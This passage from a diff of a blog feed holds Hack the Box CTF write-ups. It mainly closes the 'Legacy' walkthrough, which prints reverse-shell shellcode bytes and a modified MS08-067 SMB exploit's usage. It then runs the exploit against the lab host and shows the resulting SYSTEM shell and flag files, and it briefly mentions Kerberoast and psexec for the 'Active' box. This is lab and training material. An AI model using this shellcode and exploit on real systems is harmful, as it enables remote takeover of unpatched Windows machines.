+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x87\x32\xfc\xc7\x9c\x0e\xc4\xc9\xa2\x46\x22&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xd3\xf2\xc5\x8c\xc3\xb3\x78\x41\xe2\x92\x7e&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x6c\x1d\xc1\xee\x05\xbd\x83\x32\xc4\xd3\x18&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xf5\x9f\x97\x70\xf1\x8f\x3e\xc2\x32\xd7\xcf&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x92\x6a\x05\xa6\x8b\x5a\xb4\xa6\x18\x8d\x05&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xee\x45\x88\x71\x43\x52\x76\x83\xee\x54\x81&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x6e\x9a\x65\xba\xf3\x17\xa8\xc4\xaa\x9a\x77&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xe1\x05\xb7\xb7\xb8\x5d\x89\x18\xb5\xc5\x64&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xcb\xa5\x8f\x3c\x18\xbd\x05\xee\x43\x30\xca&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xcb\xb7\xe2\xd5\x8e\xca\xe3\xdf\x10\x73\xe6&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xd1\xb5\x18\xab\x65\x62\xce\xd1\xbd\xdd\x93&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xb9\xe6\x98\xe0\x8b\xd1\xbb\xfb\xf5\xf9\xc9&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x94\x46\x5b\x57\x03\xb8\x8e\xef\xba\x7d\xda&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xbf\xfb\x90\x0e\x84\x93\x46\x5b\xbf\xc3\xe9&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xde\xaf\xc3\xf9\xde\x87\x79\xb6\x51\x0f\x6c&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x6c\x19\x85\x96\xd1\x84\xe5\x9d\x98\xe6\xed&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x93\xa8\xdf\x66\x75\xd3\x9e\xb9\xc4\xd1\x17&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x4a\xe7\xd8\x71\x3a\x16\x79\xfa\xe3\x6c\xf7&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x86\x9a\x7f\xd1\x7e\x5a\x31\xef\x71\x3a\xfb&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xda\xe3\x8b\x93\x30\x6d\xb8\xc4\xee\xbf\x19&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xf9\xab\xd7\xb9\x71\x44\xe8\x28\xd7\x9d\xb2&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xee\x92\x34\xca\xcb\x83\x7f\x8e\xab\xc7\xe9&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xd8\xb9\xc5\xff\xd8\xa1\xc5\xef\xdd\xb9\xfb&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xc0\x42\xd0\x15\x46\x5b\x66\x73\xf7\xd8\xa9&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x6c\x89\xe6\xe7\x14\xa4\xee\x10\x46\x02\x6e&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xf2\xb9\xb3\xe6\x49\x06\x04\x13\x10\x46\x85&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x88\x93\x99\x39\x75\x0f\xe6\xbc\x35\xa8\x80&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xcb\xe1\x85\x93\xea\x71\x3a&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+
+&lt;span class="c1"&gt;# ------------------------------------------------------------------------&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Executing the script without any arguments reveals the usage isntructions.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/ms08_067# python ./ms08_067_2018.py 
+&lt;span class="c1"&gt;#######################################################################&lt;/span&gt;
+&lt;span class="c1"&gt;#   MS08-067 Exploit&lt;/span&gt;
+&lt;span class="c1"&gt;#   This is a modified verion of Debasis Mohanty&amp;#39;s code (https://www.exploit-db.com/exploits/7132/).&lt;/span&gt;
+&lt;span class="c1"&gt;#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi&lt;/span&gt;
+&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;span class="c1"&gt;#   Mod in 2018 by Andy Acer:&lt;/span&gt;
+&lt;span class="c1"&gt;#   - Added support for selecting a target port at the command line.&lt;/span&gt;
+&lt;span class="c1"&gt;#     It seemed that only 445 was previously supported.&lt;/span&gt;
+&lt;span class="c1"&gt;#   - Changed library calls to correctly establish a NetBIOS session for SMB transport&lt;/span&gt;
+&lt;span class="c1"&gt;#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste&lt;/span&gt;
+&lt;span class="c1"&gt;#     into this source file.&lt;/span&gt;
+&lt;span class="c1"&gt;#######################################################################&lt;/span&gt;
+
+
+Usage: ./ms08_067_2018.py &amp;lt;target ip&amp;gt; &amp;lt;os &lt;span class="c1"&gt;#&amp;gt; &amp;lt;Port #&amp;gt;&lt;/span&gt;
+
+Example: MS08_067_2018.py &lt;span class="m"&gt;192&lt;/span&gt;.168.1.1 &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;445&lt;/span&gt; -- &lt;span class="k"&gt;for&lt;/span&gt; Windows XP SP0/SP1 Universal, port &lt;span class="m"&gt;445&lt;/span&gt;
+Example: MS08_067_2018.py &lt;span class="m"&gt;192&lt;/span&gt;.168.1.1 &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;139&lt;/span&gt; -- &lt;span class="k"&gt;for&lt;/span&gt; Windows &lt;span class="m"&gt;2000&lt;/span&gt; Universal, port &lt;span class="m"&gt;139&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;445&lt;/span&gt; could also be used&lt;span class="o"&gt;)&lt;/span&gt;
+Example: MS08_067_2018.py &lt;span class="m"&gt;192&lt;/span&gt;.168.1.1 &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="m"&gt;445&lt;/span&gt; -- &lt;span class="k"&gt;for&lt;/span&gt; Windows &lt;span class="m"&gt;2003&lt;/span&gt; SP0 Universal
+Example: MS08_067_2018.py &lt;span class="m"&gt;192&lt;/span&gt;.168.1.1 &lt;span class="m"&gt;4&lt;/span&gt; &lt;span class="m"&gt;445&lt;/span&gt; -- &lt;span class="k"&gt;for&lt;/span&gt; Windows &lt;span class="m"&gt;2003&lt;/span&gt; SP1 English
+Example: MS08_067_2018.py &lt;span class="m"&gt;192&lt;/span&gt;.168.1.1 &lt;span class="m"&gt;5&lt;/span&gt; &lt;span class="m"&gt;445&lt;/span&gt; -- &lt;span class="k"&gt;for&lt;/span&gt; Windows XP SP3 French &lt;span class="o"&gt;(&lt;/span&gt;NX&lt;span class="o"&gt;)&lt;/span&gt;
+Example: MS08_067_2018.py &lt;span class="m"&gt;192&lt;/span&gt;.168.1.1 &lt;span class="m"&gt;6&lt;/span&gt; &lt;span class="m"&gt;445&lt;/span&gt; -- &lt;span class="k"&gt;for&lt;/span&gt; Windows XP SP3 English &lt;span class="o"&gt;(&lt;/span&gt;NX&lt;span class="o"&gt;)&lt;/span&gt;
+Example: MS08_067_2018.py &lt;span class="m"&gt;192&lt;/span&gt;.168.1.1 &lt;span class="m"&gt;7&lt;/span&gt; &lt;span class="m"&gt;445&lt;/span&gt; -- &lt;span class="k"&gt;for&lt;/span&gt; Windows XP SP3 English &lt;span class="o"&gt;(&lt;/span&gt;AlwaysOn NX&lt;span class="o"&gt;)&lt;/span&gt;
+
+Also: nmap has a good OS discovery script that pairs well with this exploit:
+nmap -p &lt;span class="m"&gt;139&lt;/span&gt;,445 --script-args&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;unsafe&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; --script /usr/share/nmap/scripts/smb-os-discovery &lt;span class="m"&gt;192&lt;/span&gt;.168.1.1
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Of note are the several &lt;code&gt;os #&lt;/code&gt; options; it looks like the exact exploitation is language-dependent.  Legacy is an English box, so the most likely exploits should be 6 or 7.&lt;/p&gt;
+&lt;p&gt;First, we need to set up an Ncat listener (I use &lt;code&gt;rlwrap&lt;/code&gt; for &lt;a href="https://twitter.com/pix/status/1198688097665503232"&gt;fancy features&lt;/a&gt;).  Remember to set the port to the one you specified for your shellcode.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# rlwrap ncat -nvlp 4433&lt;/span&gt;
+Ncat: Version &lt;span class="m"&gt;7&lt;/span&gt;.80 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org/ncat &lt;span class="o"&gt;)&lt;/span&gt;
+Ncat: Listening on :::4433
+Ncat: Listening on &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:4433
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Next, we execute the python exploit with the target IP, OS #, and port.  I will be attempting 6 first.&lt;/p&gt;
+&lt;h4&gt;Executing the exploit to get a reverse shell&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/ms08_067# python ./ms08_067_2018.py &lt;span class="m"&gt;10&lt;/span&gt;.10.10.4 &lt;span class="m"&gt;6&lt;/span&gt; &lt;span class="m"&gt;445&lt;/span&gt;&lt;span class="c1"&gt;#######################################################################&lt;/span&gt;
+&lt;span class="c1"&gt;#   MS08-067 Exploit&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;SNIP&lt;span class="o"&gt;]&lt;/span&gt;
+
+Windows XP SP3 English &lt;span class="o"&gt;(&lt;/span&gt;NX&lt;span class="o"&gt;)&lt;/span&gt;
+
+&lt;span class="o"&gt;[&lt;/span&gt;-&lt;span class="o"&gt;]&lt;/span&gt;Initiating connection
+&lt;span class="o"&gt;[&lt;/span&gt;-&lt;span class="o"&gt;]&lt;/span&gt;connected to ncacn_np:10.10.10.4&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="se"&gt;\p&lt;/span&gt;ipe&lt;span class="se"&gt;\b&lt;/span&gt;rowser&lt;span class="o"&gt;]&lt;/span&gt;
+Exploit finish
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Back in the listener:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Ncat: Connection from &lt;span class="m"&gt;10&lt;/span&gt;.10.10.4.
+Ncat: Connection from &lt;span class="m"&gt;10&lt;/span&gt;.10.10.4:1028.
+Microsoft Windows XP &lt;span class="o"&gt;[&lt;/span&gt;Version &lt;span class="m"&gt;5&lt;/span&gt;.1.2600&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;span class="o"&gt;(&lt;/span&gt;C&lt;span class="o"&gt;)&lt;/span&gt; Copyright &lt;span class="m"&gt;1985&lt;/span&gt;-2001 Microsoft Corp.
+
+C:&lt;span class="se"&gt;\W&lt;/span&gt;INDOWS&lt;span class="se"&gt;\s&lt;/span&gt;ystem32&amp;gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Shell on first try!&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;C:&lt;span class="se"&gt;\W&lt;/span&gt;INDOWS&lt;span class="se"&gt;\s&lt;/span&gt;ystem32&amp;gt;whoami &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; hostname
+whoami &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; hostname
+&lt;span class="s1"&gt;&amp;#39;whoami&amp;#39;&lt;/span&gt; is not recognized as an internal or external command,
+operable program or batch file.
+legacy
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The error displayed from &lt;code&gt;whoami&lt;/code&gt;, combined with the knowledge that this is an SMB exploit, are good indicators that this process is running as &lt;code&gt;NT AUTHORITY\SYSTEM&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;We can locate the &lt;code&gt;user.txt&lt;/code&gt; and &lt;code&gt;root.txt&lt;/code&gt; flags in the john and Administrator user directories respectively.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;C:&lt;span class="se"&gt;\W&lt;/span&gt;INDOWS&lt;span class="se"&gt;\s&lt;/span&gt;ystem32&amp;gt;dir &lt;span class="s2"&gt;&amp;quot;C:\Documents and Settings\john\Desktop&amp;quot;&lt;/span&gt;
+dir &lt;span class="s2"&gt;&amp;quot;C:\Documents and Settings\john\Desktop&amp;quot;&lt;/span&gt;
+ Volume in drive C has no label.
+ Volume Serial Number is 54BF-723B
+
+ Directory of C:&lt;span class="se"&gt;\D&lt;/span&gt;ocuments and Settings&lt;span class="se"&gt;\j&lt;/span&gt;ohn&lt;span class="se"&gt;\D&lt;/span&gt;esktop
+
+&lt;span class="m"&gt;16&lt;/span&gt;/03/2017  &lt;span class="m"&gt;08&lt;/span&gt;:19     &amp;lt;DIR&amp;gt;          .
+&lt;span class="m"&gt;16&lt;/span&gt;/03/2017  &lt;span class="m"&gt;08&lt;/span&gt;:19     &amp;lt;DIR&amp;gt;          ..
+&lt;span class="m"&gt;16&lt;/span&gt;/03/2017  &lt;span class="m"&gt;08&lt;/span&gt;:19                 &lt;span class="m"&gt;32&lt;/span&gt; user.txt
+               &lt;span class="m"&gt;1&lt;/span&gt; File&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;             &lt;span class="m"&gt;32&lt;/span&gt; bytes
+               &lt;span class="m"&gt;2&lt;/span&gt; Dir&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;   &lt;span class="m"&gt;6&lt;/span&gt;.485.225.472 bytes free
+
+C:&lt;span class="se"&gt;\W&lt;/span&gt;INDOWS&lt;span class="se"&gt;\s&lt;/span&gt;ystem32&amp;gt;dir &lt;span class="s2"&gt;&amp;quot;C:\Documents and Settings\Administrator\Desktop&amp;quot;&lt;/span&gt;
+dir &lt;span class="s2"&gt;&amp;quot;C:\Documents and Settings\Administrator\Desktop&amp;quot;&lt;/span&gt;
+ Volume in drive C has no label.
+ Volume Serial Number is 54BF-723B
+
+ Directory of C:&lt;span class="se"&gt;\D&lt;/span&gt;ocuments and Settings&lt;span class="se"&gt;\A&lt;/span&gt;dministrator&lt;span class="se"&gt;\D&lt;/span&gt;esktop
+
+&lt;span class="m"&gt;16&lt;/span&gt;/03/2017  &lt;span class="m"&gt;08&lt;/span&gt;:18     &amp;lt;DIR&amp;gt;          .
+&lt;span class="m"&gt;16&lt;/span&gt;/03/2017  &lt;span class="m"&gt;08&lt;/span&gt;:18     &amp;lt;DIR&amp;gt;          ..
+&lt;span class="m"&gt;16&lt;/span&gt;/03/2017  &lt;span class="m"&gt;08&lt;/span&gt;:18                 &lt;span class="m"&gt;32&lt;/span&gt; root.txt
+               &lt;span class="m"&gt;1&lt;/span&gt; File&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;             &lt;span class="m"&gt;32&lt;/span&gt; bytes
+               &lt;span class="m"&gt;2&lt;/span&gt; Dir&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;   &lt;span class="m"&gt;6&lt;/span&gt;.485.225.472 bytes free
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Thus concludes Legacy.  Thank you for reading!&lt;/p&gt;</content><category term="ctf"></category><category term="ctf"></category><category term="hack the box"></category><category term="oscp prep"></category></entry><entry><title>Active - Hack the Box</title><link href="https://logistyxcat.github.io%5Chtb-active.html" rel="alternate"></link><published>2018-12-08T00:00:00-08:00</published><updated>2020-02-05T00:00:00-08:00</updated><author><name>Riley</name></author><id>tag:logistyxcat.github.io\htb-active.html,2018-12-08:</id><summary type="html">&lt;p&gt;Guide to Active from Hack the Box, featuring a Kerberoast attack.&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Description&lt;/h2&gt;
 &lt;p&gt;Active is a Windows Server 2008 R2 Active Directory Domain Controller.  The attack path features a well-loved attack, Kerberoast.&lt;/p&gt;
 &lt;p&gt;Active is assigned IP 10.10.10.100.&lt;/p&gt;
 &lt;h2&gt;Reconnaissance&lt;/h2&gt;
@@ -81,7 +579,7 @@ Host script results:
 &lt;p&gt;&lt;img alt="Kerberoast-stage3" src="images\ctf\htb\active\Kerberoast-stage3.jpg"&gt;&lt;/p&gt;
 &lt;p&gt;Now that we have the Administrator account password, we can use &lt;code&gt;psexec.py&lt;/code&gt; to execute commands and obtain a shell on the target system.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="roasted" src="images\ctf\htb\active\roasted.jpg"&gt;&lt;/p&gt;
-&lt;p&gt;This concludes the guide of Active from Hack the Box.&lt;/p&gt;</content><category term="ctf"></category><category term="ctf"></category><category term="hack the box"></category></entry><entry><title>Celestial - Hack the Box</title><link href="https://logistyxcat.github.io%5Chtb-celestial.html" rel="alternate"></link><published>2018-12-04T00:00:00-08:00</published><updated>2020-02-05T00:00:00-08:00</updated><author><name>Riley</name></author><id>tag:logistyxcat.github.io\htb-celestial.html,2018-12-04:</id><summary type="html">&lt;p&gt;Guide to Celestial from Hack the Box, featuring a Node.js deserialization attack.&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Preamble&lt;/h2&gt;
+&lt;p&gt;This concludes the guide of Active from Hack the Box.&lt;/p&gt;</content><category term="ctf"></category><category term="ctf"></category><category term="hack the box"></category><category term="oscp prep"></category></entry><entry><title>Celestial - Hack the Box</title><link href="https://logistyxcat.github.io%5Chtb-celestial.html" rel="alternate"></link><published>2018-12-04T00:00:00-08:00</published><updated>2020-02-05T00:00:00-08:00</updated><author><name>Riley</name></author><id>tag:logistyxcat.github.io\htb-celestial.html,2018-12-04:</id><summary type="html">&lt;p&gt;Guide to Celestial from Hack the Box, featuring a Node.js deserialization attack.&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Preamble&lt;/h2&gt;
 &lt;p&gt;The original writeup I did for this was some time ago. My methodology then didn't include nearly as many images, and the box has been retired since August 2018.  &lt;s&gt;If I had the option to redo this with better notes and images to create a better product here, I absolutley would.&lt;/s&gt;&lt;/p&gt;
 &lt;p&gt;Edit 2020-02-05:  I will be redoing this box sometime in the future.&lt;/p&gt;
 &lt;h2&gt;Description&lt;/h2&gt;
